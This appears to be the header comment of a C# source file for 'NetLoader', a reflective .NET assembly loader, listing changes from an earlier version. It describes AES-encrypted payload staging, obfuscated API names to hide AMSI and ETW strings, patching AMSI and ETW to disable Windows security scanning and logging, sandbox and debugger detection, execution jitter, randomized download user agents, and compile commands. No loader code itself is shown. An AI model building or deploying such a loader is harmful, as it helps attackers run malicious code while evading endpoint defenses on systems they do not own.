 * NetLoader - reflective assembly loader
 *
 * Changes vs the original XOR version:
 *   - Payload encryption: AES-256-CBC with PBKDF2-HMAC-SHA256 key derivation
 *     (120,000 iterations, random 16-byte salt + random 16-byte IV per payload).
 *     On-disk format: "AES1" magic (4) || salt (16) || IV (16) || ciphertext.
 *   - New CLI: -aes <passphrase> replaces -xor <key>.
 *   - -enc mode encrypts a file into the same format so payloads can be staged.
 *   - Evasion hardening:
 *       * Sensitive API/dll names are stored XOR-obfuscated and rebuilt at runtime
 *         (no "amsi.dll"/"AmsiScanBuffer"/"EtwEventWrite" strings in the binary).
 *       * ETW neutralization now covers EtwEventWrite AND EtwEventWriteEx.
 *       * AMSI/ETW patch pages are restored to their original protection after write.
 *       * Optional -sleep <seconds> with +/-25% jitter before execution.
 *       * Optional -sandbox heuristic checks (CPU/RAM/uptime/MAC vendor/username).
 *       * Optional -anti-debug (DebugSessionCheck + RemoteDebugCheck).
 *       * Decrypted payload buffer is zeroed after Assembly.Load.
 *       * Opaque-predicate junk code and NoInlining on hot paths.
 *       * -quiet suppresses banner output; randomized browser UA on downloads.
 *
 * Compile (Windows, .NET Framework 4.7.2+):
 *   csc /optimize+ /platform:anycpu /out:NetLoader.exe NetLoader_AES.cs
 * Compile (Mono):
 *   mcs -optimize+ -out:NetLoader.exe NetLoader_AES.cs
 
